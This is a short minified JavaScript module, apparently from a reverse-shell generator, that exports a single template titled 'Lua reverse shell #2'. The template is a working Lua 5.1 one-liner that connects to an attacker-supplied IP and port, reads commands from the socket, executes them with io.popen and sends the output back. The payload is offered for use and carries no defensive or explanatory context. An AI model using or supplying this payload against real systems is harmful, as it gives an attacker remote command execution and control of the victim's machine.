const e=[{title:"Lua reverse shell #2",template:`lua5.1 -e 'local host, port = "{ip}", {port} local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'`,description:"Lua 5.1 reverse shell with socket receive and command execution."}],t={commands:e};export{e as commands,t as default};
